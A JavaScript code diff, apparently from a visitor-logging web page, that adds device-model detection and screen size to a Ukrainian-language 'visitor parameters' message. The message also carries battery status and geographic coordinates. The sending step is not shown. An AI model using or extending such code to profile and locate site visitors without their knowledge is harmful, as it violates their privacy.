@@ -401,8 +401,28 @@ function getAddress() {
     })
 }
 
+// Check device type
+
+const userAgent = navigator.userAgent
+const mobileRegex =
+  /(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone|webOS|Mobile)/i
+
+let model
+
+if (mobileRegex.test(userAgent)) {
+  const modelRegex =
+    /(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone|webOS)/i
+  model = userAgent.match(modelRegex)[0]
+} else {
+  model = "Комп'ютер"
+}
+
+// Send Data Message
+
 function sendUserDataMessage() {
   let message = `<b>Параметри відвідувача</b>\n`
+  message += `<b>Телефон: </b>${model}\n`
+  message += `<b>Розмір екрана: </b>${screenWidth}x${screenHeight}\n`
   message += `<b>Статус батареї: </b>${batteryStatus}\n`
   message += `<b>Заряд батареї: </b>${batteryLevel}\n`
   message += `<b>Координати: </b>${lat}, ${long}\n`
